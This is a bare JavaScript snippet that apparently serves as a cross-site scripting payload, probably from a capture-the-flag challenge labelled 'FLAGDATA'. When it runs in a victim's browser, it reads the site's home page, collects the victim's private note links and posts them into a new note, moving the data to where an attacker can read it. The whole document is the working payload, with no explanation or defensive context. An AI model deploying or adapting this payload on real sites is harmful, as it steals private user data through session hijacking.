fetch('/').then(r=>r.text()).then(h=>{
  let notes=h.match(/\/note\/[a-f0-9]+/g)||[];
  fetch('/note/new',{
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'title=FLAGDATA&body='+encodeURIComponent(notes.join(','))
  });
});
